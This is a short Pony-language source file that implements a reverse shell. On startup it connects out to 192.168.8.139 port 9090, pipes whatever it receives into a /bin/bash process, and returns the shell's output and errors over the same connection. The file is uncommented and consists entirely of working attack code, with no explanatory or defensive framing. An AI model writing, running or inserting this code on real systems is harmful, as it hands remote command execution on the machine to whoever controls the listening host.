use "net"
use "process"
use "files"

class ReadNotify is TCPConnectionNotify
  let _env: Env

  new create(env: Env) =>
    _env = env

  fun ref received(
    conn: TCPConnection ref,
    data: Array[U8] iso,
    times: USize)
    : Bool
  =>
    let client = WriteNotify(conn)
    let notifier: ProcessNotify iso = consume client
    try
      let path = FilePath(_env.root as AmbientAuth, "/bin/bash")
      let args: Array[String] val = ["bash"]
      let vars: Array[String] val = ["HOME=/"; "PATH=/bin"]
      let auth = _env.root as AmbientAuth
      let pm: ProcessMonitor = ProcessMonitor(auth, auth, consume notifier,
      path, args, vars)
      pm.write(consume data)
    end
    true

  fun ref connect_failed(conn: TCPConnection ref) =>
    None


class WriteNotify is ProcessNotify
  let _conn: TCPConnection

  new iso create(conn: TCPConnection) =>
    _conn = conn

  fun ref stdout(process: ProcessMonitor ref, data: Array[U8] iso) =>
    _conn.write(String.from_array(consume data))

  fun ref stderr(process: ProcessMonitor ref, data: Array[U8] iso) =>
    _conn.write(String.from_array(consume data))

  fun ref failed(process: ProcessMonitor ref, err: ProcessError) =>
    _conn.write(err.string())

actor Main
  new create(env: Env) =>
    try
      TCPConnection(env.root as AmbientAuth,
        recover ReadNotify(env) end, "192.168.8.139", "9090")
    end
